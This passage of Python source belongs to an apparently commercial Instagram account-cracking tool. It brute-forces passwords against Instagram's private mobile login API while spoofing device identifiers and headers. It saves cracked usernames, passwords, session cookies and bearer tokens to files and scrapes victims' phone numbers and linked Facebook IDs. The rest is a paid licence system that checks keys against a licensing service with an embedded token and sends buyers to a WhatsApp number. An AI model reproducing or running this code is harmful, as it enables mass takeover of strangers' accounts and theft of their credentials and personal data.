			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				#print(f"\r{H}account: {fullname[:10]}\nUsername: {username}\nPassword: {password}\nPengikut: {peng}\nMengikuti: {meng}\nPostingan: {post}\nCookies: {cookies}")
				cetak(panel(f'''\r                                               
 [white][[green]√[white]] Fullname     : [green]{fullname}
 [white][[green]√[white]] Username     : [green]{username}
 [white][[green]√[white]] Password     : [green]{password}
 [white][[green]√[white]] Facebook acc : [green]{fbid}
 [white][[green]√[white]] Phone        : [green]{phone}
 [white][[green]√[white]] Postingan    : [green]{post}
 [white][[green]√[white]] Pollowers    : [green]{peng}
 [white][[green]√[white]] Pollowing    : [green]{meng}
 [white][[green]√[white]] Cokies       : [green]{cookies}
 [white][[green]√[white]] Auth         : [green]{ig_set_authorization}
 [white][[green]√[white]] UserAgent    : [green]{uag}\n                                                  ''',title=f"[bold white][ [green]Succes [bold white]]",style=f"bold green"))
		#		print(f"\r{P}FullName: {H}{fullname[:10]}{P}\nUsername: {H}{username}{P}\nPassword: {H}{password}{P}\nPengikut: {H}{peng}{P}\nMengikuti: {H}{meng}\n{P}Postingan: {H}{post}{P}\nfb_id: {H}{fbid}{P}\n{P}Authorization: {A}{ig_set_authorization};{cookies}{P}\n")
				open('hasil/Ok-Instagram.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{cookies}\n")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				cetak(panel(f'''\r                                                        
 [white][[red]×[white]] Hasil        : [red]Chek
 [white][[red]×[white]] Username     : [red]{username}
 [white][[red]×[white]] Password     : [red]{password}
 [white][[red]×[white]] Pollower     : [red]{peng}
 [white][[red]×[white]] Pollowing    : [red]{meng}   
 [white][[red]×[white]] Postingan    : [red]{post}
 [white][[red]×[white]] Useragent    : [red]{uag}\n                                                  ''',title=f"[bold white][ [red]Check [bold white]]",style=f"bold red"))                                            
				#print(f"\r{M}account: {fullname[:10]}\nUsername: {username}\nPassword: {password}\nPengikut: {peng}\nMengikuti: {meng}\nPostingan: {post}")
			#	print(f"\r{P}FullName: {H}{fullname[:10]}{P}\nUsername: {H}{username}{P}\nPassword: {H}{password}{P}\nPengikut: {H}{peng}{P}\nMengikuti: {H}{meng}\n")
				open('hasil/Cp-Instagram.txt','a').write('%s|%s|%s\n'%(username, password, peng))
				break
			elif 'ip_block' in str(response.text.replace('\\', '')):
				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				print(f"Harap tunggu beberapa menit", end='\r')
				time.sleep(0.10)
			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
				sys.stdout.flush()
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1

def Crack_N(username, memek):
	global Ok, Cp, Loop
	sys.stdout.write(f"\rstatus ip: {H}aman{P} api2 {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
	sys.stdout.flush()
	for password in memek:
		try:
			ua = Useragent().useragent_api()
			ses = requests.Session()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8daB8e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/',data=data)
			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
				Ok+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				time.sleep(0.10)
				cetak(panel(f'''\r                                               
 [white]Fullname     : [green]{fullname[:10]}
 [white]Username     : [green]{username}
 [white]Password     : [green]{password}
 [white]Facebook Acc : [green]{fbid}
 [white]Phone        : [green]{phone}
 [white]Postingan    : [green]{post}
 [white]Pollowers    : [green]{peng}
 [white]Pollowing    : [green]{meng}
 [white]Cokies       : [green]{cookies}
 [white]UserAgent    :[green]{ua}\n                                                  ''',title=f"[bold white][ [green]Succes [bold white]]",style=f"bold green"))
				open('/sdcard/Ress/Ok-Instagram.txt','a').write(f"{username}|{password}\n{peng}|{meng}\n{ig_set_authorization}\n")
				break
			elif 'checkpoint' in str(response.text) or 'https://i.instagram.com/challenge/' in str(response.text):
				Cp+=1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                               ", end='\r')
				cetak(panel(f'''\r                                                        
 [white]Status       : [red]Checkpoint
 [white]Username     : [red]{username}
 [white]Password     : [red]{password}
 [white]Pollower     : [red]{peng}
 [white]Pollowing    : [red]{meng}   
 [white]Postingan    : [red]{post}
 [white]Useragent    : [red]{ua}\n                                                  ''',title=f"[bold white][ [red]Check [bold white]]",style=f"bold red"))
				open('/sdcard/Ress/Cp-Instagram.txt','a').write('%s|%s\n'%(username, password))
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:time.sleep(20)
	Loop+=1


def tlisensi():
    logo()
    #self.mentod()
    cetak(panel('[[red]![white]] Lisensi Tidak Valid Atau Tidak Terdaftar\n[[red]![white]] Silahkan Ketik "[green]Buy[green][white]" Untuk Membeli Lisensi',width=50))
    time.sleep(1)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     cetak(nel(f'[[red]![white]] Harap Diisi Jangan Kosong '));sleep(3)
     os.system('clear')()
     tlisensi()
    if lisen in ['buy','Buy']:
     cetak(panel(f'[[blue]1[white]] 1 MINGGU [green]Rp15.000[white] [[blue]3[white]] 5 BULAN [green] Rp80.000[white]\n[[blue]2[white]] 1 BULAN [green] Rp30.000[white] [[blue]4[white]] 1 TAHUN [green] Rp150.000[white]',title=f'[[green] HARGA [white]]',width=50))
     cetak(panel(f'[[red]![white]] Trial 1 Hari Ketik "[green]trial[white]" Ke Wa Author',width=50))
     os.system('xdg-open https://wa.me/6289504552726?text=Bang+beli+lisensi+IG+nya+dong');exit()
     loadinglisen()
     open('.key.txt','w').write(lisen)
     lisensi()   
def lisensi():
 try:
  cek=open('.key.txt').read()
  lisensikuni.append(cek)
 except:
  os.system:(f' rm -rf .key.txt')
  tlisensi()
  ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIxMTQzNDYyMTEiLCJkdyt0SkJ6MWp6Q1RuVVR3NzFRR214R0k3bWoxQWJ0eVpHSndWZFV6Il0=&ProductId=31473&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
    banner()
    cetak(panel('[green]SUCCESFULL LOGIN , YOUR LICENSE IS VERIFIED ✅[green]'))
    time.sleep(2)
    lisensiku.append("sukses")
    login_kamu()
 elif status ==KeyError:
    os.system('rm -rf .key.txt')
 else:
    tlisensi()

def loadinglisen():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;32m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]


#----------------[ CLASS BRUTE ]----------------#
class Brute:
    def __init__(self):
        self.tw, self.ok, self.cp, self.id, self.lp = 0, 0,0, [], 0
        
        self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',}
        self.param = {'count': '200','max_id': 'KhamdihiDev','search_surface': 'follow_list_page'}
        self.dire = 'data/user/login'
        self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

    def Path(self):
        if os.path.isfile('data/user/login/cokie.txt') is True:
           try:
               cokie, nama = open('data/user/login/cokie.txt','r',encoding='utf-8').read().split('<=>')
               xyz = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; uk_UA; 98288242)'}
               uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
               req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['full_name']
               req1 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['follower_count']
               req2 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['following_count']
               req3 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':cokie}).json()['user']['username']
               return cokie,req,req1,req2,req3
           except:self.Login()
        else:self.Login()

    def cek_day(self):
        if os.path.isfile(f'{self.dire}/day.txt') is True:
           xyz = open(self.dire+'/day.txt','r').read()
           return(xyz)
        else:
           AssetAndKey()

    #----------------[ LOGO ]----------------#
    def Logooo(self):
        cetak(panel(f'''[- code by [green]@suysaja[white] -]\n[green]┏┓┳┳┳┳┓┏┏┓  
┗┓┃┃┃┃┗┫┗┓  
┗┛┗┛┗┛┗┛┗┛  [white]\nInstagram Tools''',width=50))
    def Clear(self):
        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except:pass
        




#----------------[ CLASS ASSET AND KEYS ]----------------#
class AssetAndKey:
    
    def __init__(self) -> None:
        self.dire = 'data/user/login'
        self.byps = Brute()
        self.data,self.user,self.login = ('data'), ('user'), ('login')
        self.CreateDir()
        self.CekKeys()

    def CreateDir(self):
        try:os.mkdir(self.data)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user +'/'+ self.login)
        except:pass

    def Keys(self):
        self.byps.Clear()
        self.byps.Logooo()
        self.g4 = requests.Session().get('http://ip-api.com/json').json()['query']
        self.g3 = requests.Session().get('http://ip-api.com/json').json()['country']
        urut = []
        #urut.append(panel(f"{H2}{self.g4}",title=f"IP",subtitle=f"{B}{self.g3}",padding=(0,2)))
       # Console(width=70,style="bold grey100").print(Columns(urut),justify="center")
        cetak(panel(f'[green]{self.g4}[white]',title=f"IP",subtitle=f'{self.g3}[white]',padding=(0,2),width=20))
        cetak(panel('[[red]![white]] Lisensi Tidak Valid Atau Terdaftar\n[[red]![white]] free trial 1 hari[white]\n[[red]![white]] Silahkan Ketik [[green]buy[green][white]] Untuk Membeli Lisensi',width=50))
       # cetak(panel(f'[[red]![white]] free trial 1 hari[white]', width=50))
        auth = input('[•] Masukan Lisensi : ')
        xnxx = auth.lower()
        if auth == 'buy' or auth == 'Buy' or auth == 'BUY':
           cetak(panel(f'[[blue]01[white]] 1 MINGGU [green]Rp15.000[white] [[blue]03[white]] 5 BULAN [green] Rp80.000[white]\n[[blue]02[white]] 1 BULAN [green] Rp35.000[white] [[blue]04[white]] 1 TAHUN [green] Rp150.000[white]',title=f'[[green] HARGA [white]]',width=50))
           cetak(panel(f'[[red]![white]] trial 1 hari ketik "[green]trial[white]"', width=50))
           bu = input('[•] pilih : ')
           if bu == '1' or bu == '01':
              print(f'\n{P}[{HS}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
              os.system('xdg-open https://wa.me/6289504552726?text=Bang+beli+lisensi+IG+nya+dong+yang+1+minggu');exit()
           elif bu == 'trial' or bu == 'Trial' or bu == 'TRIAL':
                print(f'\n{P}[{HS}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
                os.system('xdg-open https://wa.me/6289504552726?text=Bang+Mau+Trial+Lisensi+IG+Nya+Dong');exit()
           elif bu == '2' or bu == '02':
                print(f'\n{P}[{HS}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
                os.system('xdg-open https://wa.me/6289504552726?text=Bang+beli+lisensi+IG+nya+dong+yang+1+bulan');exit()
           elif bu == '3' or bu == '03':
                print(f'\n{P}[{HS}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
                os.system('xdg-open https://wa.me/6289504552726?text=Bang+beli+lisensi+IG+nya+dong+yang+5+bulan');exit()
           elif bu == '4' or bu == '04':
                print(f'\n{P}[{HS}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
                os.system('xdg-open https://wa.me/6289504552726?text=Bang+beli+lisensi+IG+nya+dong+yang+1+tahun');exit()
           else:print(f'\nketik yg bener');time.sleep(1),self.Keys()
        if auth == "'Info'" or auth == 'INFO' or auth == 'info':
           tab = Table()
           tab.add_column(f'{H2}NO.', style=f'bold grey100', justify='center')
           tab.add_column(f'{P}MENU', style=f'bold grey100', justify='center', width=43)
           tab.add_column(f'{H2}PRICE', style=f'bold grey100', justify='center')
           tab.add_row(f'{H2}01.',f'{P}Durasi 1 Minggu',f'{H2}25.000')
           tab.add_row(f'{H2}02.',f'{P}Durasi 1 Bulan',f'{H2}65.000')
           tab.add_row(f'{H2}03.',f'{P}Open Source Script',f'{H2}250.000')
           Console().print(tab, justify='center',style=f'bold grey100')
           ykh = console.input(f' {P}[{H2}•{P}] Pilihan Lisensi : ')
           if ykh =='1' or ykh =='01':
             console.print(f' {P}[{H2}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
             os.system('xdg-open https://wa.me/+6289504552726?text=Bang%20beli%20lisensi%20SIB%2C%20durasi%201%20minggu%20dong') ; time.sleep(2) ; self.Keys()
           elif ykh =='2' or ykh =='02':
               console.print(f' {P}[{H2}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
               os.system('xdg-open https://wa.me/+6289504552726?text=Bang%20beli%20lisensi%20SIB%2C%20durasi%201%20bulan%20dong') ; time.sleep(3.1) ; self.Keys()
           elif ykh =='3' or ykh =='03':
              console.print(f' {P}[{H2}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
              os.system('xdg-open https://wa.me/+6289504552726?text=Bang%20beli%20open%20source%20SIB%20dong') ; time.sleep(3.1) ; self.Keys()
           else:self.keys()
        elif auth == 'BUY' or auth == "'Buy'" or auth =="buy":
           console.print(f' {P}[{H2}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin')
           os.system('xdg-open https://wa.me/+6289504552726?text=*Assalamualaikum%20bang%20mau%20beli%20lisensi%20SIB%20tools%20dong*') ; time.sleep(3.1) ; self.Keys()
        else:
           if len(auth) <=5:exit()
           else:self.confirm(auth)

    def confirm(self, keys, token='WyIxMTQzNDYyMTEiLCJkdyt0SkJ6MWp6Q1RuVVR3NzFRR214R0k3bWoxQWJ0eVpHSndWZFV6Il0=', produc_id='31473'):
        import datetime
        skrg = datetime.datetime.now()
        hari = skrg.day
        buln = skrg.month
        thun = skrg.year
        try:
            link = requests.get("https://app.cryptolens.io/api/key/Activate?token={}&ProductId={}&Key={}".format(token,produc_id,keys)).json()
            expd = link["licenseKey"]["expires"][:10]
            tahun,bulan,tanggal = expd.split("-")
            date = "%s%s%s"%(int(tanggal),int(bulan),int(tahun))
            neww = "%s%s%s"%(hari,buln,thun)
            if (len(neww)) == 7:
               neww = "0%s%s%s"%(hari,buln,thun)
            else:
               neww = neww
            form = "%d%m%Y"
            tess = datetime.datetime.strptime(date,form)
            mekk = datetime.datetime.strptime(neww,form)
            xnxx = tess - mekk
            sisa = xnxx.days
            if sisa <1:
               os.system(f'rm -rf {self.dire}/key.txt')
               cetak(panel(f'''[red]lisensi yang kamu miliki sudah kadaluwarsa\ncek kembali key lisensimu dan ulangi login\njika belum punya license chat admin dengan ketik [[green]buy[red]]''',width=50)); time.sleep(3) ; sys.exit()
               #cetak(panel(f'''[red]cek kembali lisensimu dan ulangi login license''',width=50)); time.sleep(3) ; sys.exit()
            else:
               self.byps.Clear()
               self.byps.Logooo()
               cetak(panel(f'''[white][green]SUCCESFULL LOGIN YOUR LICENSE IS VERIFIED ✅[green]''',width=50)); time.sleep(1.1)
               cetak(panel(f"[white]berlaku sampai [green]{tess}[white]",width=50))
               time.sleep(3.5)
               open(self.dire+'/key.txt','w',encoding='utf-8').write(f'{keys}')
               open(self.dire+'/day.txt','w',encoding='utf-8').write(f'{sisa}')
               Menu(sisa)
        except KeyError:
           os.system(f'rm -rf {self.dire}/key.txt')
           cetak(panel(f'''[red]lisensi yang kamu miliki sudah kadaluwarsa''',width=50)) ; time.sleep(3) ; sys.exit()
        except Exception as e:print(e)

    def CekKeys(self):
        if os.path.isfile(f'{self.dire}/key.txt') is True:
           keys = open(self.dire+'/key.txt','r').read()
           self.confirm(keys)
        else:
           self.Keys()

#----------------[ CLASS LISENSI & INIT SELF ]----------------#
from time import sleep
class Lisensi:
   
   def __init__(self):
       self.ses       = requests.Session()
       self.url        = 'https://app.cryptolens.io'
       self.token     = 'WyIxMTQzNDYyMTEiLCJkdyt0SkJ6MWp6Q1RuVVR3NzFRR214R0k3bWoxQWJ0eVpHSndWZFV6Il0='
       self.bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04":
       "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09":
       "September", "10": "Oktober", "11": "November", "12": "Desember"}
       self.data,self.user,self.login = ('data'), ('user'), ('login')
       self.CreateDir()
       self.ProductId = '31473'
       self.byps = Brute()

#----------------[ ANIMASI ]----------------#
   def animasi(self):
       exec = [f"[ {M2}■{P}□□□□□□□□□ ]",f"[ {K2}■■{P}□□□□□□□□ ]", f"[ {H2}■■■{P}□□□□□□□ ]", f"[ {J2}■■■■{P}□□□□□□ ]", f"[ {N2}■■■■■{P}□□□□□ ]", f"[ {B}■■■■■■{P}□□□□ ]", f"[ {O2}■■■■■■■{P}□□□ ]", f"[ {A2}■■■■■■■■{P}□□ ]", f"[ {H2}■■■■■■■■■{P}□ ]", f"[ {U2}■■■■■■■■■■{P} ]"]
       for bool in range(50):
           sleep(0.1)
           Console().print(f'\r  {P}[{H2}+{P}] Please Wait... ' + exec[bool % len(exec)] +'',end='\r')

   def CreateDir(self):
        try:os.mkdir(self.data)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user)
        except:pass
        try:os.mkdir(self.data +'/'+ self.user +'/'+ self.login)
        except:pass

#----------------[ CLEAR TERMINAL ]----------------#
   def clearTerminal(self):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")

#----------------[ DELETE LISENSI ]----------------#
   def removeLisensi(self):
       try:os.system('rm -rf data/.LisensiLog.json')
       except:pass

#----------------[ WHATSAPP ADMIN ]----------------#
   def WhatsApp(self):
       cetak(panel(f'''{P}[{H2}!{P}] Tunggu Sebentar Anda Akan Di Arahkan Ke WhatsApp Admin''',width=80,padding=(0,1),style=f"bold grey100"))
       try:
           self.wa = os.system("xdg-open https://wa.me/+12136998771?text=Assalamualaikum%20bang%20beli%20lisensi%20SIB%20nya%20dong")
           return self.wa
       except:pass

#----------------[ LOGO ]----------------#
   def Logooo(self):
       cetak(panel(f'''[- code by [green]@suysaja[white] -]\n[green]┏┓┳┳┳┳┓┏┏┓  
┗┓┃┃┃┃┗┫┗┓  
┗┛┗┛┗┛┗┛┗┛  [white]\nInstagram Tools''',width=50,padding=(1,19),style="bold grey100"))

#----------------[ HALAMAN PASTE LISENSI ]----------------#
   def pasteLisen(self):
       self.clearTerminal() ; self.byps.Logooo()
       cetak(panel(f'''{P}[{H2}+{P}] Silahkan Masukkan Lisensi Tools Yang Anda Miliki\n{P}[{H2}+{P}] Belum Mempunyai Lisensi? ketik {P}( {H2}BELI{P} ) Untuk Melihat Harga''',width=80,padding=(0,1),style=f"bold grey100"))
       set = Console().input(f'  {P}[{H2}?{P}] Masukan Lisensi Tools : ')
       if set =='' or set =='':
         cetak(panel(f'''{P}[{M2}!{P}] Opshhh Silahkan Masukan Lisensi Anda Dan Jangan Kosong''',width=80,padding=(0,1),style=f"bold grey100"))
         sleep(3) ; self.pasteLisen()
       elif set =='beli' or set =='Beli' or set =='BELI':self.Harga()
       try:
            search = self.ses.get(f'''{self.url}/api/key/Activate?token={self.token}&ProductId={self.ProductId}&Key={set}&Sign=True''').json()['licenseKey']['key']
            open("data/.LisensiLog.json","w").write(set)
            cetak(panel(f'''{P}[{H2}✓{P}] Selamat Lisensi Yang Anda Masukan Terdaftar Ke Server SIB Kami''',width=80,padding=(0,1),style=f"bold grey100"))
            sleep(3) ; self.chekData() ; sys.exit()
       except KeyError as e:
            cetak(panel(f'''{P}[{M2}!{P}] Opshh Lisensi Yang Anda Masukan Tidak Terdaftar Di Server SIB Kami''',width=80,padding=(0,1),style=f"bold grey100"))
            sleep(3) ; sys.exit()
       except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
            cetak(panel(f'''{P}[{M2}!{P}] Opshh Koneksi Internet Kamu Hilang. Pastikan Terhubung Dengan INTERNET/WiFi''',width=80,padding=(0,1),style=f"bold grey100"))
            sleep(3) ; sys.exit()

#----------------[ HARGA LISENSI ]----------------#
   def Harga(self):
       cetak(panel(f'''{P}[{H2}01{P}]. Lisensi 1 Minggu 50.000 max Pemakaian 1 Device\n{P}[{H2}02{P}]. Lisensi 1 Bulan 100.000 Max Pemakaian 5 Device\n{P}[{H2}03{P}]. Permanen Open Source 250.000 Full Update''',width=80,padding=(0,1),style=f"bold grey100"))
       bool = Console().input(f'  {P}[{H2}?{P}] Masukan Pilihan : ')
       if bool =='' or bool =='':cetak(panel(f'''{P}[{M2}!{P}] Opshhhh Silahkan Masukan Pilihan Yang Tersedia Di Atas Ye Bro''',width=80,padding=(0,1),style=f"bold grey100")); sleep(3) ; self.pasteLisen()
       elif bool =='1' or bool =='01':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       elif bool =='2' or bool =='02':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       elif bool =='3' or bool =='03':self.WhatsApp() ; sleep(3) ; self.pasteLisen()
       else:cetak(panel(f'''{P}[{M2}!{P}] Opshhhh Silahkan Masukan Pilihan Yang Tersedia Di Atas Ye Bro''',width=80,padding=(0,1),style=f"bold grey100")); sleep(3) ; self.pasteLisen()

#----------------[ CHECK DATA LISENSI ]----------------#
   def chekData(self):
       self.clearTerminal() ; self.Logooo()
       urut = []
       try:
            b = self.ses.get(f"{self.url}/api/key/Activate?token={self.token}&ProductId={self.ProductId}&Key={open('data/.LisensiLog.json','r').read()}").json()
            c        = b['licenseKey']
            key      = c['key'][0:11]
            tahun    = c['expires'][0:4]
            buln     = c['expires'][5:7]
            tanggal  = c['expires'][8:10]
            bulan    = self.bulan_ttl[buln]
            tahun1   = c['created'][0:4]
            buln1    = c['created'][5:7]
            tanggal1 = c['created'][8:10]
            bulan1   = self.bulan_ttl[buln1]
       except:
            key       = "None"
            tanggal   = "None"
            bulan     = "None"
            tahun     = "None"
            tanggal1  = "None"
            bulan1    = "None"
            tahun1    = "None"
       urut.append(panel(f'''{K2}*{M2} Lisensi => {H2}{key}-****-****\n{K2}*{M2} Join    => {H2}{tanggal1} {bulan1} {tahun1}\n{K2}*{M2} Expired => {H2}{tanggal} {bulan} {tahun}''',padding=(0,1), style="bold grey100"))
       Console(width=70,style="bold grey100").print(Columns(urut),justify="center")
